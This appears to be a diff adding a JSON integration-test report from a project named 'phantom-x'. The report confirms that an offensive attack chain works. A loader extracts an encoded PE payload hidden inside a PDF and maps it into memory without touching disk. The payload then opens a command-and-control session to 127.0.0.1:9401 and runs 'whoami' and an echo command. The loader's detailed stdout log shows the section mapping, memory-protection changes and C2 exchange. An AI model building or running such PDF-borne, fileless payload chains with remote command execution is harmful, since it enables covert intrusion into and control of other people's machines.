@@ -1,0 +1,52 @@
+{
+  "started_utc": "2026-11-10T20:12:50.526875+00:00",
+  "pdf": "/home/syco/phantom-x/phase1_pdf/samples/px_attack_chain.pdf",
+  "loader": "/home/syco/phantom-x/phase3_fileless/loader/px_loader.exe",
+  "command": "wine \"/home/syco/phantom-x/phase3_fileless/loader/px_loader.exe\" \"/home/syco/phantom-x/phase1_pdf/samples/px_attack_chain.pdf\"",
+  "checks": [
+    {
+      "name": "chain established a C2 session through the PDF",
+      "pass": true,
+      "detail": "session=1"
+    },
+    {
+      "name": "HELLO parsed",
+      "pass": true,
+      "detail": "host=KALI arch=x64 pid=296"
+    },
+    {
+      "name": "latency measured",
+      "pass": true,
+      "detail": "0.40 ms"
+    },
+    {
+      "name": "EXEC 'whoami' returned output",
+      "pass": true,
+      "detail": "'KALI\\\\root'"
+    },
+    {
+      "name": "EXEC 'cmd /c echo PHANTOM_X_CHAIN_PROOF' returned output",
+      "pass": true,
+      "detail": "'PHANTOM_X_CHAIN_PROOF'"
+    },
+    {
+      "name": "command output is correct",
+      "pass": true,
+      "detail": "'PHANTOM_X_CHAIN_PROOF'"
+    },
+    {
+      "name": "commands were dispatched",
+      "pass": true,
+      "detail": "completed=2"
+    },
+    {
+      "name": "controlled session termination",
+      "pass": true,
+      "detail": "payload acknowledged EXIT"
+    }
+  ],
+  "loader_stdout": "[loader] opening /home/syco/phantom-x/phase1_pdf/samples/px_attack_chain.pdf\n[loader] pdf size 8442 bytes\n[loader] embedded file: inflated bytes (encoded flate)\n[loader]   encoded 7011 -> decoded 20472\n[loader] extracted '' (20472 bytes)\n[loader] first bytes: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00\n[loader] PE: machine=0x8664 imagebase=0x40000000 sizeofimage=0x1c000 entry=0x1790\n[loader] mapped at preferred base 0000000040000000 (no relocations needed)\n[loader]   section .text    va=0x01000 raw=0x01600 vsize=0x01580 chars=0x60000020\n[loader]   section .rdata   va=0x03000 raw=0x00400 vsize=0x00280 chars=0x40000040\n[loader]   section .pdata   va=0x04000 raw=0x00200 vsize=0x00060 chars=0x40000040\n[loader]   section .xdata   va=0x05000 raw=0x00200 vsize=0x00068 chars=0x40000040\n[loader]   section .edata   va=0x1a000 raw=0x00200 vsize=0x0004a chars=0x40000040\n[loader]   section .idata   va=0x1b000 raw=0x00600 vsize=0x004f8 chars=0x40000040\n[loader] resolved 32 import(s)\n[loader]   protect .text    va=0x01000 size=0x01580 new=0x40 old=0x4\n[loader]   protect .rdata   va=0x03000 size=0x00280 new=0x4 old=0x4\n[loader]   protect .pdata   va=0x04000 size=0x00060 new=0x4 old=0x4\n[loader]   protect .xdata   va=0x05000 size=0x00068 new=0x4 old=0x4\n[loader]   protect .bss     va=0x06000 size=0x14000 new=0x4 old=0x4\n[loader]   protect .edata   va=0x1a000 size=0x0004a new=0x4 old=0x4\n[loader]   protect .idata   va=0x1b000 size=0x004f8 new=0x4 old=0x4\n[loader] entry page 0000000040001790 protect=0x40 state=0x1000\n[loader] mapped image region: base=0000000040000000 size=0x1c000\n[loader]   VirtualQuery: base=0000000040000000 allocbase=0000000040000000 region=0x1000 state=0x1000 protect=0x4 type=0x20000\n[loader] entry point at 0000000040001790\n[loader] payload running on thread 304\n[loader] calling entry point 0000000040001790\n[px] connecting to 127.0.0.1:9401\n[px] connected\n[px] EXEC 2 : whoami\n[px] EXEC 3 : cmd /c echo PHANTOM_X_CHAIN_PROOF\n[px] EXIT received\n[px] finished\n[loader] payload thread exited\n",
+  "finished_utc": "2026-11-10T20:12:54.519558+00:00",
+  "result": "pass",
+  "audit_log": "/tmp/px_chain_itest.jsonl"
+}
